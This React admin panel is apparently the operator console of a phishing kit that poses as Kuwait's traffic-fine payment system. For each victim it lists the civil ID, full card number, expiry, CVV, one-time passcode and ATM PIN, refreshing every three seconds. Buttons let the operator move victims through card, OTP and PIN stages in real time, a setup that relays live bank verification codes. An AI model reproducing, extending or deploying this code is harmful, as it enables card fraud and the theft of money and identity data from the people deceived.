import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { 
  Users, 
  ClipboardList, 
  CheckCircle, 
  Clock, 
  Activity, 
  LogOut,
  ShieldAlert,
  CreditCard,
  Key,
  Hash,
  Calendar,
  RefreshCw,
  AlertTriangle
} from 'lucide-react';

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  civilId: string | null;
  enquiryType: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

const stageConfig: Record<Stage, { label: string; color: string; bg: string; icon: any }> = {
  card:         { label: "جديد",              color: "text-blue-600", bg: "bg-blue-50", icon: Activity },
  card_pending: { label: "انتظار دفع",        color: "text-amber-600", bg: "bg-amber-50", icon: Clock },
  otp:          { label: "انتظار OTP",        color: "text-purple-600", bg: "bg-purple-50", icon: Key },
  otp_pending:  { label: "انتظار OTP",        color: "text-purple-600", bg: "bg-purple-50", icon: Key },
  atm:          { label: "انتظار PIN",        color: "text-indigo-600", bg: "bg-indigo-50", icon: ShieldAlert },
  atm_pending:  { label: "انتظار PIN",        color: "text-indigo-600", bg: "bg-indigo-50", icon: ShieldAlert },
  success:      { label: "مكتمل",             color: "text-emerald-600", bg: "bg-emerald-50", icon: CheckCircle },
  failed:       { label: "فشل",               color: "text-red-600", bg: "bg-red-50", icon: AlertTriangle },
};

export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");

  const loginMutation = trpc.admin.login.useMutation();
  const verifyQuery = trpc.admin.verify.useQuery({ token: token || "" }, { enabled: !!token, retry: false });
  const sessionsQuery = trpc.admin.getSessions.useQuery({ token: token || "" }, { enabled: !!token && verifyQuery.data?.valid === true, refetchInterval: 3000 });
  const actionMutation = trpc.admin.action.useMutation();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await loginMutation.mutateAsync({ password });
      if (res.success) {
        localStorage.setItem("adminToken", res.token);
        setToken(res.token);
      }
    } catch (err: any) {
      setLoginError("كلمة المرور غير صحيحة");
    }
  };

  const handleAction = async (sessionId: string, action: "pass" | "denied" | "completed", errorMsg?: string) => {
    if (!token) return;
    await actionMutation.mutateAsync({ token, sessionId, action, errorMessage: errorMsg });
    sessionsQuery.refetch();
  };

  const handleLogout = () => {
    localStorage.removeItem("adminToken");
    setToken(null);
  };

  if (!token || !verifyQuery.data?.valid) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 font-sans" dir="rtl">
        <div className="bg-white rounded-2xl shadow-xl border border-gray-100 p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <div className="bg-[#000576] w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-lg">
              <ShieldAlert className="text-white w-8 h-8" />
            </div>
            <h2 className="text-2xl font-bold text-gray-900">لوحة الإدارة</h2>
            <p className="text-gray-500 mt-2">يرجى إدخال كلمة المرور للوصول للنظام</p>
          </div>
          
          <form onSubmit={handleLogin} className="space-y-6">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">كلمة المرور</label>
              <input 
                type="password" 
                className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
                value={password} 
                onChange={e => setPassword(e.target.value)} 
                required 
              />
            </div>
            {loginError && (
              <div className="flex items-center gap-2 text-red-600 bg-red-50 p-3 rounded-lg text-sm">
                <AlertTriangle className="w-4 h-4" />
                <span>{loginError}</span>
              </div>
            )}
            <button 
              type="submit" 
              className="w-full bg-[#000576] text-white py-3 rounded-xl font-bold hover:bg-blue-900 transition-all shadow-lg shadow-blue-100"
              disabled={loginMutation.isPending}
            >
              {loginMutation.isPending ? 'جاري التحقق...' : 'دخول النظام'}
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Calculate stats
  const sessions = (sessionsQuery.data as any)?.sessions || [];
  const stats = {
    total: sessions.length,
    new: sessions.filter((s: any) => s.stage === 'card').length,
    processing: sessions.filter((s: any) => ['card_pending', 'otp', 'otp_pending', 'atm', 'atm_pending'].includes(s.stage)).length,
    completed: sessions.filter((s: any) => s.stage === 'success').length,
    online: sessions.filter((s: any) => {
      const lastUpdate = new Date(s.updatedAt).getTime();
      return Date.now() - lastUpdate < 30000; // Online if updated in last 30s
    }).length
  };

  const StatCard = ({ title, value, icon: Icon, color, bgColor }: any) => (
    <div className="bg-white rounded-xl shadow-sm border border-gray-100 p-5 transition-all hover:shadow-md">
      <div className="flex items-center justify-between">
        <div>
          <p className="text-xs font-medium text-gray-500 mb-1">{title}</p>
          <h3 className="text-xl font-bold text-gray-900">{value}</h3>
        </div>
        <div className={`${bgColor} p-2.5 rounded-lg`}>
          <Icon className={`w-5 h-5 ${color}`} />
        </div>
      </div>
    </div>
  );

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col font-sans" dir="rtl">
      {/* Header - Optimized Size */}
      <header className="bg-[#000576] text-white shadow-md sticky top-0 z-50 py-2 px-4">
        <div className="max-w-[1600px] mx-auto flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="bg-white p-1 rounded-md">
              <ShieldAlert className="text-[#000576] w-6 h-6" />
            </div>
            <h1 className="text-base md:text-lg font-bold">نظام مخالفات مرور الكويت</h1>
          </div>
          
          <div className="flex items-center gap-4 md:gap-8">
            <div className="flex items-center gap-2 bg-green-500/20 px-3 py-1 rounded-full border border-green-500/30">
              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
              <span className="text-xs font-medium text-green-100">متصل</span>
            </div>
            
            <button 
              onClick={handleLogout}
              className="flex items-center gap-2 hover:text-red-300 transition-colors text-xs md:text-sm font-medium"
            >
              <LogOut className="w-4 h-4" />
              <span>خروج</span>
            </button>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-[1600px] mx-auto w-full p-4 md:p-6">
        {/* Stats Grid */}
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6">
          <StatCard 
            title="إجمالي العمليات" 
            value={stats.total} 
            icon={ClipboardList} 
            color="text-blue-600" 
            bgColor="bg-blue-50" 
          />
          <StatCard 
            title="عمليات جديدة" 
            value={stats.new} 
            icon={Activity} 
            color="text-amber-600" 
            bgColor="bg-amber-50" 
          />
          <StatCard 
            title="قيد المعالجة" 
            value={stats.processing} 
            icon={Clock} 
            color="text-purple-600" 
            bgColor="bg-purple-50" 
          />
          <StatCard 
            title="مكتملة" 
            value={stats.completed} 
            icon={CheckCircle} 
            color="text-emerald-600" 
            bgColor="bg-emerald-50" 
          />
          <StatCard 
            title="متصل الآن" 
            value={stats.online} 
            icon={Users} 
            color="text-indigo-600" 
            bgColor="bg-indigo-50" 
          />
        </div>

        {/* Sessions Table */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="p-4 border-b border-gray-100 flex items-center justify-between bg-gray-50/50">
            <h3 className="font-bold text-gray-800">قائمة العمليات المباشرة</h3>
            <div className="flex items-center gap-2 text-xs text-gray-500">
              <RefreshCw className={`w-3 h-3 ${sessionsQuery.isFetching ? 'animate-spin' : ''}`} />
              تحديث تلقائي كل 3 ثواني
            </div>
          </div>
          
          <div className="overflow-x-auto">
            <table className="w-full text-right border-collapse">
              <thead>
                <tr className="bg-gray-50 text-gray-500 text-xs uppercase tracking-wider">
                  <th className="px-6 py-4 font-semibold">التاريخ</th>
                  <th className="px-6 py-4 font-semibold">الرقم المدني</th>
                  <th className="px-6 py-4 font-semibold">بيانات البطاقة</th>
                  <th className="px-6 py-4 font-semibold">المبلغ</th>
                  <th className="px-6 py-4 font-semibold">الحالة</th>
                  <th className="px-6 py-4 font-semibold">الرموز المستلمة</th>
                  <th className="px-6 py-4 font-semibold text-center">الإجراءات</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {sessions.map((s: PaymentSession) => {
                  const config = stageConfig[s.stage] || stageConfig.failed;
                  const StatusIcon = config.icon;
                  
                  return (
                    <tr key={s.id} className="hover:bg-gray-50/50 transition-colors">
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="text-sm text-gray-900">{new Date(s.createdAt).toLocaleDateString('ar-KW')}</div>
                        <div className="text-xs text-gray-400">{new Date(s.createdAt).toLocaleTimeString('ar-KW')}</div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="font-mono text-sm bg-gray-100 px-2 py-1 rounded text-gray-700">{s.civilId}</span>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2">
                          <CreditCard className="w-4 h-4 text-gray-400" />
                          <span className="text-sm font-medium">{s.cardNumberMasked || s.cardNumber || '---'}</span>
                        </div>
                        {(s.cardExpiry || s.cardCvv) && (
                          <div className="flex gap-3 mt-1 text-[10px] text-gray-400">
                            <span className="flex items-center gap-1"><Calendar className="w-3 h-3" /> {s.cardExpiry}</span>
                            <span className="flex items-center gap-1"><Hash className="w-3 h-3" /> {s.cardCvv}</span>
                          </div>
                        )}
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className="text-sm font-bold text-blue-700">{s.totalAmount} دك</span>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${config.bg} ${config.color}`}>
                          <StatusIcon className="w-3.5 h-3.5" />
                          {config.label}
                        </span>
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex flex-col gap-1">
                          {s.otpCode && (
                            <div className="flex items-center gap-1.5 bg-purple-50 text-purple-700 px-2 py-0.5 rounded text-xs w-fit">
                              <Key className="w-3 h-3" />
                              <span className="font-bold">OTP: {s.otpCode}</span>
                            </div>
                          )}
                          {s.atmPin && (
                            <div className="flex items-center gap-1.5 bg-indigo-50 text-indigo-700 px-2 py-0.5 rounded text-xs w-fit">
                              <ShieldAlert className="w-3 h-3" />
                              <span className="font-bold">PIN: {s.atmPin}</span>
                            </div>
                          )}
                        </div>
                      </td>
                      <td className="px-6 py-4 whitespace-nowrap">
                        <div className="flex items-center justify-center gap-2">
                          <button 
                            onClick={() => handleAction(s.sessionId, "pass")}
                            className="bg-emerald-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold hover:bg-emerald-700 transition-all shadow-sm"
                          >
                            التالي
                          </button>
                          <button 
                            onClick={() => handleAction(s.sessionId, "denied", "فشلت العملية")}
                            className="bg-red-50 text-red-600 px-3 py-1.5 rounded-lg text-xs font-bold hover:bg-red-100 transition-all"
                          >
                            رفض
                          </button>
                          <button 
                            onClick={() => handleAction(s.sessionId, "completed")}
                            className="bg-blue-600 text-white px-3 py-1.5 rounded-lg text-xs font-bold hover:bg-blue-700 transition-all shadow-sm"
                          >
                            إتمام
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })}
                {sessions.length === 0 && (
                  <tr>
                    <td colSpan={7} className="px-6 py-12 text-center text-gray-400 italic">
                      لا توجد عمليات حالياً...
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </main>

      <footer className="bg-white border-t border-gray-200 py-4 px-4 mt-auto">
        <div className="max-w-[1600px] mx-auto text-center text-gray-400 text-[10px]">
          &copy; {new Date().getFullYear()} نظام مخالفات مرور الكويت - لوحة الإدارة الاحترافية. جميع الحقوق محفوظة.
        </div>
      </footer>
    </div>
  );
}
